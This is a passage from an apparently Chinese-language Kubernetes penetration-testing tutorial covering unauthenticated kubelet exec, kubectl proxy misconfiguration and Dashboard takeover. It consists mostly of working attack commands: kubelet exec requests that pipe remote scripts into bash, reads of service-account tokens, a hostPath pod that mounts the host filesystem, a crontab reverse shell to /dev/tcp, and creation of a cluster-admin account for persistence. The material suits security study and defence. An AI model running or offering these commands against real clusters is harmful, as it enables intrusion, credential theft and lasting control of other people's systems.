curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://192.168.17.144:10250/exec/kube-system/kube-flannel-ds-xwk2t/kube-flannel?command=/bin/sh&command=-c&command=curl+192.168.17.161+|+bash&input=1&output=1&tty=1"
```

[![](assets/1701826061-62b1e624e8680efe4da9d7f76bb33ac0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025171318-bcba57c6-7316-1.png)  
发现也为成功，可能是笔者这里的环境问题所致，下面给出一个成功的截图：

[![](assets/1701826061-bd1eb53540e6ae2cea63740ab7f0ff94.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025171332-c5128ea2-7316-1.png)  
之后会再执行端返回用于查看执行结果的链接地址：

```bash
[root@localhost ~]# curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://192.168.4.68:10250/exec/ingress-nginx/nginx-ingress-controller-6f5cbc5444-nkdg6/nginx-ingress-controller?command=/bin/bash&command=-c&command=curl+192.168.84.158:88+|+bash&input=1&output=1&tty=1"
* About to connect() to 192.168.4.68 port 10250 (#0)
*   Trying 192.168.4.68...
* Connected to 192.168.4.68 (192.168.4.68) port 10250 (#0)
* Initializing NSS with certpath: sql:/etc/pki/nssdb
* skipping SSL peer certificate verification
* SSL connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
* Server certificate:
*   subject: CN=192.168.4.68@1544518989
*   start date: 12 月 11 09:03:09 2018 GMT
*   expire date: 12 月 11 09:03:09 2019 GMT
*   common name: 192.168.4.68@1544518989
*   issuer: CN=192.168.4.68@1544518989
> POST /exec/ingress-nginx/nginx-ingress-controller-6f5cbc5444-nkdg6/nginx-ingress-controller?command=/bin/bash&command=-c&command=curl+192.168.84.158:88+|+bash&input=1&output=1&tty=1 HTTP/1.1
> User-Agent: curl/7.29.0
> Host: 192.168.4.68:10250
> Accept: */*
> X-Stream-Protocol-Version: v2.channel.k8s.io
> X-Stream-Protocol-Version: channel.k8s.io
> 
< HTTP/1.1 302 Found
< Location: /cri/exec/zEKYcaZt                          #查看执行结果
< Date: Wed, 07 Aug 2019 06:01:42 GMT
< Content-Length: 0
< Content-Type: text/plain; charset=utf-8
< 
* Connection #0 to host 192.168.4.68 left intact
[root@localhost ~]#
```

执行如下语句查看命令执行结果

```bash
[root@localhost ~]# docker run -it --rm joshgubler/wscat -c "https://192.168.4.68:10250/cri/exec/zEKYcaZt" --no-check
```

[![](assets/1701826061-c558581c5eba734c4c3521ce28c120d4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025171431-e7d3cdb6-7316-1.png)  
Step 7：连接 K8s Master 地址  
此时我们是在 Node 的 Pod 里，在反弹的 Shell 里查看 Master 的内部 IP  
[![](assets/1701826061-6bde7a6d4b7b6266caa7d9221204dbdd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025171442-eecdfcfe-7316-1.png)  
尝试连接 K8s Master 地址

```bash
[root@localhost ~]# TOKEN_VALUE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
[root@localhost ~]# curl -k --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H  "Authorization: Bearer $TOKEN_VALUE" https://10.0.0.1:443/api/v1/pods
```

### kube-proxy 配置错误

**基本介绍**  
Kubectl Proxy 代理程序既能作为 API Server 的反向代理，也能作为普通客户端访问 API Server 的代理，当开发人员使用 Kubectl proxy 将 API Server 外置时攻击者可以通过使用和 K8s API Server 未授权一样的漏洞实施攻击操作  
**漏洞利用**  
Step 1：通过执行以下命令启动我们自定义的

```bash
kubectl proxy --port=8080 --address=192.168.17.144 --api-prefix=/ --disable-filter=true
```

[![](assets/1701826061-6a4e55565746fb10f43d41b34e78b676.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025171652-3c460710-7317-1.png)  
Step 2：之后再浏览器中访问  
[![](assets/1701826061-9d9ed9ddf48d8db7ee8c08dd7fcf0471.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025171707-44f8aad4-7317-1.png)  
Step 3：之后和 K8s API Server 未授权利用一致，例如：获取节点信息

```bash
#格式说明
kubectl -s ip:port get nodes

#执行实例
kubectl -s 192.168.17.144:8080 get nodes
```

[![](assets/1701826061-e2fc8ae85f71ef306ea29e86ed941125.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025171727-51097b46-7317-1.png)

### 控制面版

#### Dashboard 未授权访问

**漏洞描述**  
K8s Dashboard 默认是存在鉴权机制的，用户可以通过 kubeconfig 或者 Token 两种方式登录，当用户开启了 enable-skip-login 时可以在登录界面点击 Skip 跳过登录直接进入 Dashboard，而且有时候可以直接访问 K8s DashBoard，在这种情况下攻击者可以通过部署恶意 Pod 实现控制节点的目的

**漏洞复现**  
K8s DashBoard 未授权访问：  
[![](assets/1701826061-65a9e09e7439892c222a1c90c170485c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172056-cdc60924-7317-1.png)  
**宿主 Shell**  
Step 1：通过 WEB UI 界面创建一个 pod，并将本地根目录挂载到 pod 的/mnt 目录中

```bash
apiVersion: v1
kind: Pod
metadata:
  name: myapp
spec:
  containers:
  - image: nginx
    name: container
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
```

[![](assets/1701826061-552dbee7c5fab054bdd7bcc73cf0cff6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172123-dd643fea-7317-1.png)

[![](assets/1701826061-fb39390d701d33a4f0a467b1428a5214.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172134-e3eeca4c-7317-1.png)  
Step 2：之后可以看到创建的 myapp Pod

[![](assets/1701826061-76300eec922a6cd849472ab3452d6d7f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172146-eb1cd700-7317-1.png)  
Step 3：之后进入挂载的/mnt 目录中，就是 master 节点的对应目录了

[![](assets/1701826061-08370dcc43dff0e1537f6f391dc6e5fb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172158-f28e764c-7317-1.png)

[![](assets/1701826061-e2f65e650aa43d2f970bba0a4b4e60a8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172207-f7a59e8a-7317-1.png)  
Step 4：之后写计划任务

```bash
echo -e "* * * * * root bash -i >& /dev/tcp/192.168.17.157/4444 0>&1\n" >> /mnt/etc/crontab
```

[![](assets/1701826061-a12db7112b9ff0aae3442db3db61544d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172224-02317568-7318-1.png)  
Step 5：成功反弹 shell

[![](assets/1701826061-e316ab916a03ac4f51299c23a8aea988.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172237-0989004c-7318-1.png)

**额外扩展**  
获取 K8s Service Account 认证凭据

```bash
cat /var/run/secrets/kuberenetes.io/serviceaccount/token
```

[![](assets/1701826061-616e031cc239e277e3f27a79bf080e11.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172259-17072cee-7318-1.png)

### Dashboard Config 登录

**利用场景**

-   项目托管不当导致 kubernetconfig 文件泄露，例如：Github、Gitlab 等，之后接管 Kubernet dashboard
-   在获取到 Node 节点权限的情况下通过 kubeconfig 来接管 Kubernet dashboard

**基础知识**  
用户凭证保存在 kubeconfig 文件中，kubectl 通过以下顺序来找到 kubeconfig 文件

-   如果提供了--kubeconfig 参数，就使用提供的 kubeconfig 文件
-   如果未提供--kubeconfig 参数，但设置了环境变量$KUBECONFIG，则使用该环境变量提供的 kubeconfig 文件
-   如果以上两种情况都没有，那么 kubectl 就使用默认的 kubeconfig 文件$HOME/.kube/config

**利用流程**  
Step 1：获取 namespace

```bash
kubectl get namespace
```

[![](assets/1701826061-eee5707c6433127dab582f1292582830.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172422-482dec5e-7318-1.png)  
Step 2：创建 dashboard 管理用户

```bash
kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard
```

[![](assets/1701826061-a0689a51bd2bb58d735303878a8b5597.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172442-540ee5aa-7318-1.png)  
Step 3：绑定用户为集群管理用户

```bash
kubectl create clusterrolebinding dashboard-cluster-admin --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:dashboard-admin
```

[![](assets/1701826061-34d758e9509fe2e688f5fb32b6c7b3cc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172504-61233098-7318-1.png)  
Step 4：获取 tocken(后续可以使用 token 登录)

```bash
kubectl get sa,secrets -n kubernetes-dashboard

kubectl describe secret -n kubernetes-dashboard dashboard-admin-token-kqsll
```

[![](assets/1701826061-fbb7c993c049eccf9854617cba70ec78.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172525-6e2335ea-7318-1.png)

[![](assets/1701826061-58e8c4bcca438124d8342f84f7eabf99.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172540-76dbad20-7318-1.png)  
Step 5：生成 kubeconfig 文件

```bash
DASH_TOCKEN=$(kubectl get secret -n kubernetes-dashboard dashboard-admin-token-kqsll -o jsonpath={.data.token}|base64 -d)
```

[![](assets/1701826061-d997c208c9adf95d8af83b6423821e15.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172600-827ef8b2-7318-1.png)

```bash
kubectl config set-cluster kubernetes --server=192.168.17.144:30001 --kubeconfig=/home/r00t/dashbord-admin.conf
kubectl config set-credentials dashboard-admin --token=$DASH_TOCKEN --kubeconfig=/home/r00t/dashbord-admin.conf
kubectl config set-context dashboard-admin@kubernetes --cluster=kubernetes --user=dashboard-admin --kubeconfig=/home/r00t/dashbord-admin.conf
kubectl config use-context dashboard-admin@kubernetes --kubeconfig=/home/r00t/dashbord-admin.conf
```

[![](assets/1701826061-0b3728f2ac64d3f859f6df354b74cb3e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172615-8b7823a8-7318-1.png)  
Step 6：赋予读写执行权限

```bash
chmod 777 dashboard-admin.conf
```

[![](assets/1701826061-0e69e9ee6ea5e44673c674d4b130c483.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172633-968d0aa6-7318-1.png)  
Step 7：使用生成的 dashbord-admin.conf 登录 dashboard

[![](assets/1701826061-3c79024d240518b9e25e3b47f8fc5d79.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172646-9e3efa5c-7318-1.png)

[![](assets/1701826061-14b5ce5b01b43b53c3c9d9e75b8599b8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172656-a3eaf8de-7318-1.png)

## 文末小结

由于篇幅过长关于 K8s 的逃逸、横向移动、权限维持、扩展技巧等下篇文章再补，写不动了
